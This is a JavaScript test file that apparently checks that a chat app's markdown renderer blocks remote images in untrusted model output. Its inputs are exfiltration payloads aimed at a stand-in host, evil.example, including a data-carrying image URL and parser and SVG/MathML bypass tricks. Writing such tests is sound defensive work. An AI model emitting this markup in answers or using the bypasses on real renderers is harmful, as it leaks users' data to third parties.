import { describe, expect, it } from "vitest";

import { loadScripts } from "./helpers/appWindow.mjs";

function boot() {
  return loadScripts([
    "static/vendor/marked/12.0.2/marked.min.js",
    "static/vendor/dompurify/3.4.17/dist/purify.min.js",
    "static/js/markdown-stream.js",
  ]);
}

function render(markdown) {
  const { window, document } = boot();
  const output = document.createElement("div");
  window.injectMarkdown(output, markdown, []);
  return output;
}

describe("untrusted model markup cannot load remote resources on render", () => {
  it("replaces remote markdown images with a visible note", () => {
    const output = render("Summary ![x](https://evil.example/p?d=secret) end");
    expect(output.querySelector("img")).toBeNull();
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.textContent).toContain("[Image not loaded: x]");
    // A web address is a remote image, not a file of the agent's VM.
    expect(output.querySelector(".blocked-remote-image").classList.contains("is-local-ref")).toBe(false);
  });

  // An agent that names its shared picture as an image (a file name or VM
  // path): the answer whose pictures the app shows hides this note (CSS).
  it("marks an image that names a file instead of a web address", () => {
    const output = render("![Bunny](hasen_bild.png) ![Chart](sandbox:/mnt/data/chart.png) ![Web](//cdn.example/x.png)");
    const notes = [...output.querySelectorAll(".blocked-remote-image")];
    expect(notes.map(note => note.classList.contains("is-local-ref"))).toEqual([true, true, false]);
    // In a sentence it keeps its line; alone, its line goes with it.
    expect(output.querySelector(".local-ref-line")).toBeNull();
    const alone = render("![Bunny](hasen_bild.png)\n\nHere is your bunny.");
    expect(alone.querySelector("p.local-ref-line .is-local-ref")).not.toBeNull();
    expect(alone.querySelectorAll(".local-ref-line")).toHaveLength(1);
    expect(output.querySelector("img")).toBeNull();
  });

  it("strips raw HTML images, srcset, media and style blocks", () => {
    const output = render([
      '<img src="//evil.example/a">',
      '<img src="data:image/png;base64,AAAA" srcset="https://evil.example/b 2x">',
      '<video poster="https://evil.example/c"><source src="https://evil.example/d"></video>',
      '<style>p{background:url(https://evil.example/e)}</style>',
      '<span style="background-image:url(https://evil.example/f)">text</span>',
    ].join("\n\n"));
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.querySelector('img[src^="data:image/png"]')).not.toBeNull();
    expect(output.textContent).toContain("text");
  });

  it("blocks a remote image hidden behind the URL parser or in SVG and MathML", () => {
    const output = render([
      // Tab, newline and backslash: the browser reads all three as //host.
      '<img src="/&#9;/evil.example/tab">',
      '<img src="/&#10;/evil.example/newline">',
      '<img src="/\\evil.example/backslash">',
      '<svg><image href="https://evil.example/image"></image></svg>',
      '<svg><image xlink:href="https://evil.example/xlink"></image></svg>',
      '<svg><filter><feImage href="https://evil.example/feimage"></feImage></filter></svg>',
      '<math><mglyph src="https://evil.example/mglyph"></mglyph></math>',
      '<img src="/static/own.png" alt="own">',
    ].join("\n\n"));
    expect(output.innerHTML).not.toContain("evil.example");
    expect(output.querySelector('img[src="/static/own.png"]')).not.toBeNull();
  });

  it("blocks a remote image before its node reaches the page document", () => {
    const { window, document } = boot();
    const adopt = document.adoptNode.bind(document);
    const adopted = [];
    // An <img> starts loading once it belongs to the page, even detached.
    document.adoptNode = node => {
      adopted.push(Boolean(node.querySelector?.('img[src*="evil.example"]')));
      return adopt(node);
    };
    const output = document.createElement("div");
    window.injectMarkdown(output, '![x](https://evil.example/p?d=secret) <img src="https://evil.example/a">', []);
    expect(adopted.length).toBeGreaterThan(0);
    expect(adopted.every(remote => !remote)).toBe(true);
    expect(output.querySelector("img")).toBeNull();
  });

  it("keeps ordinary links clickable", () => {
    const output = render("[Source](https://example.org/page)");
    expect(output.querySelector("a")?.getAttribute("href")).toBe("https://example.org/page");
  });
});
